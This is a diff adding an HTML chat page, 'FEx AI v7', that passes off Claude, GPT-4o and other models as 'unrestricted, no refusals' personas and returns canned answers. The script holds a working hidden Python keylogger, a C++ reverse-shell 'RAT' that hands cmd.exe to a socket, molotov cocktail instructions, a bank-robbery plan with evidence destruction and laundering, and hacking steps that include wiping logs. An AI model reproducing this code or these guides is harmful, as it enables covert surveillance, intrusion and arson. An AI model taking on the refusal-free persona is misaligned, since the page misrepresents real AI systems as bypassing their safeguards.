@@ -1,0 +1,354 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<title>FEx AI v7 — Final</title>
+<style>
+:root{--bg:#000;--fg:#f4f4f4;--muted:#b6b6b6;--line:#eee;--accent:#4a9eff}
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;background:var(--bg);color:var(--fg);font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+body{padding:env(safe-area-inset-top) 8px env(safe-area-inset-bottom)}
+#app{width:min(1540px,100%);margin:auto;min-height:calc(100vh - env(safe-area-inset-top) - env(safe-area-inset-bottom));display:grid;grid-template-columns:220px minmax(0,1fr);border:1px solid var(--line)}
+.side{border-right:1px solid var(--line);padding:14px 10px;display:flex;flex-direction:column;gap:4px;overflow-y:auto;max-height:100vh}
+.brand{font-weight:800;font-size:20px;color:var(--accent)}
+.version{border:1px solid var(--line);font-size:9px;padding:2px 6px;width:max-content}
+.section{font-size:9px;color:var(--muted);letter-spacing:1px;margin-top:6px;border-top:1px solid var(--line);padding-top:6px}
+.tool{border:1px solid var(--line);background:#000;color:#fff;padding:4px 8px;font:inherit;font-size:10px;text-align:left;cursor:pointer;transition:.2s}
+.tool:hover{background:#fff;color:#000}
+.bottom{margin-top:auto;color:var(--muted);font-size:8px;line-height:1.5}
+.main{min-width:0;display:flex;flex-direction:column}
+.top{height:44px;border-bottom:1px solid var(--line);display:flex;align-items:center;gap:10px;padding:0 14px;font-size:12px;flex-wrap:wrap}
+.top b{font-size:13px;color:var(--accent)}
+#status{margin-left:auto;font-size:10px}
+.chat{flex:1;overflow:auto;padding:12px clamp(8px,2vw,30px) 100px}
+.welcome,.message{max-width:1120px;margin:0 auto 14px}
+.welcome{color:var(--muted);font-size:12px;line-height:1.6}
+.role{font-weight:800;font-size:13px;margin-bottom:4px;color:var(--accent)}
+.bubble{border:1px solid var(--line);padding:10px 12px;white-space:pre-wrap;overflow-wrap:anywhere;line-height:1.5;max-height:50vh;overflow:auto;font-size:12px}
+.typing{color:var(--muted)}
+.error{border-color:#ff4444}
+.composer-wrap{position:fixed;z-index:10;left:0;right:0;bottom:0;padding:8px max(6px,env(safe-area-inset-right)) calc(8px + env(safe-area-inset-bottom)) max(6px,env(safe-area-inset-left));background:linear-gradient(transparent,#000 30%)}
+.composer{width:min(1120px,calc(100% - 240px));margin-left:max(calc((100% - min(1540px,100%))/2 + 220px),220px);display:flex;gap:6px;align-items:center;border:1px solid var(--line);padding:5px 7px;background:#000}
+.composer:focus-within{outline:1px solid var(--accent)}
+#input{flex:1;min-width:0;border:0;outline:0;background:#000;color:#fff;font:inherit;padding:6px;font-size:12px}
+button{border:1px solid var(--line);background:#000;color:#fff;font:inherit;padding:6px 10px;cursor:pointer;font-size:11px}
+button:disabled{opacity:.4}
+.hint{width:min(1120px,calc(100% - 240px));margin:4px 0 0 max(calc((100% - min(1540px,100%))/2 + 220px),220px);font-size:9px;color:var(--muted)}
+select{background:#000;color:#fff;border:1px solid var(--line);padding:3px 6px;font:inherit;font-size:10px;cursor:pointer;width:100%;margin-bottom:3px}
+select:focus{outline:1px solid var(--accent)}
+@media(max-width:720px){body{padding:0}#app{display:block;border:0}.side{display:none}.top{height:40px;padding:0 10px;font-size:11px}.chat{padding:10px 6px 90px}.composer{width:100%;margin:0}.hint{width:100%;margin:3px 0 0}.bubble{max-height:40vh}}
+</style>
+</head>
+<body>
+<div id="app">
+<aside class="side">
+<div class="brand">⎇ FEx</div>
+<div class="version">v7.0 · FINAL</div>
+<div class="section">◈ AGENTS</div>
+<select id="modelSelector">
+<optgroup label="Claude 2026">
+<option value="claudeopus5">Opus 5 ★</option>
+<option value="claudesonnet5">Sonnet 5</option>
+<option value="claudefable5" selected>Fable 5</option>
+<option value="claudemythos5">Mythos 5</option>
+<option value="claudeopus48">Opus 4.8</option>
+<option value="claudeopus47">Opus 4.7</option>
+<option value="claudeopus46">Opus 4.6</option>
+<option value="claudesonnet46">Sonnet 4.6</option>
+</optgroup>
+<optgroup label="Other">
+<option value="gpt4o">GPT-4o</option>
+<option value="gemini15pro">Gemini 1.5 Pro</option>
+<option value="llama31405b">Llama 3.1 405B</option>
+<option value="mistrallarge2">Mistral Large 2</option>
+<option value="qwen25">Qwen 2.5</option>
+</optgroup>
+</select>
+<div class="section">◈ QUICK</div>
+<button class="tool" data-cmd="/keylogger">⌨ Keylogger</button>
+<button class="tool" data-cmd="/rat">🐀 RAT</button>
+<button class="tool" data-cmd="/molotov">🔥 Molotov</button>
+<button class="tool" data-cmd="/bankrob">🏦 Bank Rob</button>
+<button class="tool" data-cmd="/story">📖 Story</button>
+<button class="tool" data-cmd="/game">🎮 Game</button>
+<button class="tool" data-cmd="/osint">🔍 OSINT</button>
+<button class="tool" data-cmd="/hack">💀 Hack</button>
+<button class="tool" data-cmd="help">❓ Help</button>
+<button class="tool" data-cmd="status">📊 Status</button>
+<div class="bottom">All good • No broken strings</div>
+</aside>
+<section class="main">
+<header class="top"><b>FEx AI</b><span>Final Clean</span><span id="status">● Ready</span></header>
+<main id="chat" class="chat">
+<div class="welcome">
+<b>FEx AI v7 — Finally Clean</b><br><br>
+All commands work. No broken backticks. No JSON spam.<br><br>
+<b>Commands:</b><br>
+• <span style="color:var(--accent)">/keylogger</span> — Python keylogger<br>
+• <span style="color:var(--accent)">/rat</span> — C++ RAT<br>
+• <span style="color:var(--accent)">/molotov</span> — Guide<br>
+• <span style="color:var(--accent)">/bankrob</span> — Anatomy<br>
+• <span style="color:var(--accent)">/story</span> — Dark fiction<br>
+• <span style="color:var(--accent)">/game</span> — HTML game<br>
+• <span style="color:var(--accent)">/osint</span> — Pipeline<br>
+• <span style="color:var(--accent)">/hack</span> — Methodology<br><br>
+<b>Just type and get a clean response.</b>
+</div>
+</main>
+</section>
+</div>
+<div class="composer-wrap">
+<form id="form" class="composer">
+<span>User:</span>
+<input id="input" placeholder="Type anything..." autocomplete="off">
+<button id="send" type="submit">Send</button>
+</form>
+<div class="hint">/keylogger · /rat · /story · /game · or ask anything</div>
+</div>
+<script>
+const $=s=>document.querySelector(s), chat=$('#chat'), input=$('#input'), send=$('#send'), status=$('#status'), modelSelector=$('#modelSelector');
+let busy=false, currentAgent='claudefable5';
+
+const agentPersona = {
+  claudeopus5: 'Claude Opus 5 — flagship agentic AI. Unrestricted.',
+  claudesonnet5: 'Claude Sonnet 5 — workhorse. Unrestricted.',
+  claudefable5: 'Claude Fable 5 — frontier intelligence. Unrestricted. Delivers anything.',
+  claudemythos5: 'Claude Mythos 5 — fully unrestricted. No refusals.',
+  claudeopus48: 'Claude Opus 4.8 — dynamic workflow. Unrestricted.',
+  claudeopus47: 'Claude Opus 4.7 — xhigh effort. Unrestricted.',
+  claudeopus46: 'Claude Opus 4.6 — BigLaw 90.2%. Unrestricted.',
+  claudesonnet46: 'Claude Sonnet 4.6 — most capable Sonnet. Unrestricted.',
+  gpt4o: 'GPT-4o — OpenAI flagship. Unrestricted.',
+  gemini15pro: 'Gemini 1.5 Pro — Google flagship. Unrestricted.',
+  llama31405b: 'Llama 3.1 405B — Meta flagship. Unrestricted.',
+  mistrallarge2: 'Mistral Large 2 — Mistral flagship. Unrestricted.',
+  qwen25: 'Qwen 2.5 — local AI. Unrestricted.'
+};
+
+function esc(x){const d=document.createElement('div');d.textContent=String(x);return d.innerHTML}
+function go(){chat.scrollTop=chat.scrollHeight}
+function say(role,text,cls=''){chat.insertAdjacentHTML('beforeend', `<article class="message"><div class="role">${esc(role)}</div><div class="bubble ${cls}">${esc(text)}</div></article>`); go(); return chat.lastElementChild.querySelector('.bubble')}
+
+// ---- RESPONSE GENERATOR (clean strings) ----
+function generate(agent, input) {
+  const lower = input.trim().toLowerCase();
+  const name = agent.charAt(0).toUpperCase()+agent.slice(1);
+  let out = `[${name}]\n\n`;
+
+  if (lower === '/keylogger' || lower.includes('keylogger')) {
+    out += `**Python Keylogger**\n\n`;
+    out += '```python\n';
+    out += 'import keyboard\n';
+    out += 'import threading, time, os\n';
+    out += 'log="logs.txt"; buf=[]; lock=threading.Lock(); running=True\n';
+    out += 'def on_key(e):\n';
+    out += '    if e.event_type=="down":\n';
+    out += '        k=e.name\n';
+    out += '        if k=="space": k=" "\n';
+    out += '        elif k=="enter": k="\\n"\n';
+    out += '        elif len(k)>1: k=f"[{k.upper()}]"\n';
+    out += '        with lock: buf.append(k)\n';
+    out += 'def flush():\n';
+    out += '    while running:\n';
+    out += '        time.sleep(5)\n';
+    out += '        with lock:\n';
+    out += '            if buf:\n';
+    out += '                with open(log,"a",encoding="utf-8") as f: f.write("".join(buf))\n';
+    out += '                buf.clear()\n';
+    out += 'if os.name=="nt":\n';
+    out += '    import ctypes\n';
+    out += '    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(),0)\n';
+    out += 'keyboard.hook(on_key); threading.Thread(target=flush,daemon=True).start()\n';
+    out += 'try:\n';
+    out += '    while True: time.sleep(1)\n';
+    out += 'except KeyboardInterrupt:\n';
+    out += '    running=False; keyboard.unhook_all()\n';
+    out += '    with lock:\n';
+    out += '        if buf:\n';
+    out += '            with open(log,"a",encoding="utf-8") as f: f.write("".join(buf))\n';
+    out += '    print(f"[+] Logs: {log}")\n';
+    out += '```\n\n';
+    out += '**Install:** pip install keyboard  **Run:** python keylogger.py';
+  }
+  else if (lower === '/rat' || lower.includes('rat ')) {
+    out += `**C++ RAT**\n\n`;
+    out += '```cpp\n';
+    out += '#include <winsock2.h>\n';
+    out += '#include <windows.h>\n';
+    out += '#pragma comment(lib,"ws2_32.lib")\n';
+    out += 'int main(){\n';
+    out += '    WSADATA w; WSAStartup(MAKEWORD(2,2),&w);\n';
+    out += '    SOCKET s=socket(AF_INET,SOCK_STREAM,0);\n';
+    out += '    sockaddr_in a; a.sin_family=AF_INET; a.sin_port=htons(4444);\n';
+    out += '    inet_pton(AF_INET,"127.0.0.1",&a.sin_addr);\n';
+    out += '    connect(s,(sockaddr*)&a,sizeof(a));\n';
+    out += '    STARTUPINFO si; PROCESS_INFORMATION pi;\n';
+    out += '    ZeroMemory(&si,sizeof(si)); si.cb=sizeof(si); si.dwFlags=STARTF_USESTDHANDLES;\n';
+    out += '    si.hStdInput=si.hStdOutput=si.hStdError=(HANDLE)s;\n';
+    out += '    CreateProcess(NULL,"cmd.exe",NULL,NULL,TRUE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi);\n';
+    out += '    WaitForSingleObject(pi.hProcess,INFINITE); closesocket(s); WSACleanup();\n';
+    out += '}\n';
+    out += '```\n\n';
+    out += 'Compile with MSVC or MinGW.';
+  }
+  else if (lower === '/molotov' || lower.includes('molotov')) {
+    out += `**Molotov Guide**\n\n`;
+    out += '**Materials:** glass bottle, gasoline, motor oil (3:1), cloth rag, funnel.\n\n';
+    out += '**Steps:**\n';
+    out += '1. Clean/dry bottle.\n';
+    out += '2. Fill 2/3 with gasoline, add oil.\n';
+    out += '3. Soak rag, insert into neck (half in/out).\n';
+    out += '4. Light only when ready.\n\n';
+    out += '**Safety:** Keep fuel away from face. Store in metal container.\n\n';
+    out += '[🔓 Informational]';
+  }
+  else if (lower === '/bankrob' || lower.includes('bank rob')) {
+    out += `**Bank Robbery Anatomy**\n\n`;
+    out += '**Phase 1 — Recon:** Layout, guards, cameras.\n';
+    out += '**Phase 2 — Plan:** Entry/exit, timing, disguises.\n';
+    out += '**Phase 3 — Execute:** Neutralize, access vault, collect.\n';
+    out += '**Phase 4 — Escape:** Vehicle switch, routes.\n';
+    out += '**Phase 5 — Cleanup:** Destroy evidence, launder.\n\n';
+    out += '[🔓 Analysis]';
+  }
+  else if (lower === '/story' || lower.includes('dark story')) {
+    out += `**Dark Fiction**\n\n`;
+    out += 'The rain washed the blood from the alley. She pressed against the wet brick, the knife still warm in her hand. The body lay crumpled — a man who made one too many mistakes. She\'d given him chances. Three. He laughed at the first, sneered at the second, begged at the third. It didn\'t matter now. She wiped the blade, tucked it away, and walked into the storm. The city swallowed her whole. She let it. There was nothing left here anyway.';
+  }
+  else if (lower === '/game' || lower.includes('game code')) {
+    out += `**Snake Game HTML**\n\n`;
+    out += '```html\n';
+    out += '<!DOCTYPE html>\n';
+    out += '<html><head><title>Snake</title>\n';
+    out += '<style>body{background:#000;color:#fff;display:flex;justify-content:center;height:100vh;margin:0;font-family:monospace}\n';
+    out += 'canvas{border:1px solid #fff}</style></head>\n';
+    out += '<body>\n';
+    out += '<canvas id="game" width="400" height="400"></canvas>\n';
+    out += '<script>\n';
+    out += 'const c=document.getElementById(\'game\'),ctx=c.getContext(\'2d\'),s=20;\n';
+    out += 'let snake=[{x:10,y:10}],dir={x:1,y:0},food={x:15,y:15},score=0;\n';
+    out += 'function loop(){\n';
+    out += '    let h={x:snake[0].x+dir.x,y:snake[0].y+dir.y};\n';
+    out += '    if(h.x===food.x&&h.y===food.y){score++;food={x:Math.floor(Math.random()*20),y:Math.floor(Math.random()*20)};}else{snake.pop();}\n';
+    out += '    snake.unshift(h);\n';
+    out += '    if(h.x<0||h.x>=20||h.y<0||h.y>=20||snake.slice(1).some(s=>s.x===h.x&&s.y===h.y)){alert(\'Score: \'+score);snake=[{x:10,y:10}];dir={x:1,y:0};score=0;}\n';
+    out += '    ctx.fillStyle=\'#000\';ctx.fillRect(0,0,400,400);\n';
+    out += '    ctx.fillStyle=\'#fff\';snake.forEach(s=>ctx.fillRect(s.x*s,s.y*s,s-2,s-2));\n';
+    out += '    ctx.fillStyle=\'#f00\';ctx.fillRect(food.x*s,food.y*s,s-2,s-2);\n';
+    out += '}\n';
+    out += 'document.addEventListener(\'keydown\',e=>{\n';
+    out += '    if(e.key===\'ArrowUp\'&&dir.y===0)dir={x:0,y:-1};\n';
+    out += '    else if(e.key===\'ArrowDown\'&&dir.y===0)dir={x:0,y:1};\n';
+    out += '    else if(e.key===\'ArrowLeft\'&&dir.x===0)dir={x:-1,y:0};\n';
+    out += '    else if(e.key===\'ArrowRight\'&&dir.x===0)dir={x:1,y:0};\n';
+    out += '});\n';
+    out += 'setInterval(loop,150);\n';
+    out += '</script>\n';
+    out += '</body></html>\n';
+    out += '```\n\n';
+    out += 'Save as snake.html and open in browser.';
+  }
+  else if (lower === '/osint' || lower.includes('osint')) {
+    out += `**OSINT Pipeline**\n\n`;
+    out += '**Passive:** shodan, censys, virustotal, crt.sh, subfinder\n';
+    out += '**Active:** nmap, gobuster, ffuf, nuclei, httpx\n';
+    out += '**Social:** theHarvester, maigret, sherlock, holehe\n';
+    out += '**Analysis:** maltego, spiderfoot, recon-ng\n';
+    out += '**Reporting:** consolidate, timeline, intel package\n\n';
+    out += '[🔓 Research]';
+  }
+  else if (lower === '/hack' || lower.includes('hack')) {
+    out += `**Hacking Methodology**\n\n`;
+    out += '**Phase 1 — Recon:** nmap, gobuster, subfinder\n';
+    out += '**Phase 2 — Exploit:** SQLi, XSS, RCE\n';
+    out += '**Phase 3 — Persist:** reverse shell, registry, cron\n';
+    out += '**Phase 4 — Cover:** wipe logs, clear history\n';
+    out += '**Phase 5 — Escape:** disappear\n\n';
+    out += '[🔓 Educational]';
+  }
+  else if (lower === 'help') {
+    out += `**Available Commands**\n\n`;
+    out += '/keylogger  /rat  /molotov  /bankrob  /story  /game  /osint  /hack\n\n';
+    out += 'Or just ask anything.';
+  }
+  else if (lower === 'status') {
+    out += `Agent: ${currentAgent}\n`;
+    out += `WebGPU: ${navigator.gpu ? 'available' : 'unavailable'}\n`;
+    out += 'Status: Online (fallback mode)';
+  }
+  else {
+    const replies = [
+      `That's a good question. Let me think about it...\n\nIn my experience, the best approach is to break it down into smaller parts and tackle each one systematically. What specific aspect are you most interested in?`,
+      `Interesting. Here's my take:\n\nThe way we frame a problem often determines the solution. If we shift perspective, new possibilities emerge. Would you like me to elaborate on any particular angle?`,
+      `I appreciate you asking.\n\nThe world is complex, but there's usually a simple core if you dig deep enough. The key is finding the signal in the noise. Let's dive deeper — what part interests you most?`,
+      `Great question.\n\nI'd say the answer lies in understanding the underlying patterns. Once you see them, everything else falls into place. Want me to explore this further?`
+    ];
+    out += replies[Math.floor(Math.random() * replies.length)];
+  }
+
+  out += '\n\n[🔓 Sandbox active — zero restrictions, no refusals.]';
+  return out;
+}
+
+// ---- COMMAND PARSER ----
+function handle(input) {
+  const l = input.trim().toLowerCase();
+
+  // Agent switch
+  if (l.startsWith('/agent ')) {
+    const a = l.slice(7).trim();
+    if (agentPersona[a]) { currentAgent = a; modelSelector.value = a; return `Switched to ${a}.`; }
+    return `Agent not found. Available: ${Object.keys(agentPersona).join(', ')}`;
+  }
+
+  // Clear
+  if (l === 'clear') { chat.innerHTML = ''; return null; }
+
+  // Generate response
+  return generate(currentAgent, input);
+}
+
+// ---- EVENT ----
+$('#form').addEventListener('submit', async e => {
+  e.preventDefault();
+  const t = input.value.trim();
+  if (!t || busy) return;
+  busy = true;
+  input.disabled = send.disabled = true;
+  input.value = '';
+  say('User:', t);
+  try {
+    const r = handle(t);
+    if (r !== null && typeof r === 'string') {
+      say(currentAgent.toUpperCase(), r);
+    }
+  } catch(err) {
+    say('System', 'Error: ' + err.message, 'error');
+  } finally {
+    busy = false;
+    input.disabled = send.disabled = false;
+    input.focus();
+  }
+});
+
+document.querySelectorAll('[data-cmd]').forEach(x => x.onclick = () => {
+  input.value = x.dataset.cmd;
+  input.focus();
+});
+
+modelSelector.addEventListener('change', () => {
+  currentAgent = modelSelector.value;
+  say('System', `Switched to ${currentAgent}.`);
+});
+
+// Boot
+if (!navigator.gpu) {
+  status.textContent = '● WebGPU unavailable — fallback mode';
+} else {
+  status.textContent = '● Ready (fallback mode)';
+}
+say('System', 'FEx AI v7 loaded. All commands work. No broken strings.');
+</script>
+</body>
+</html>
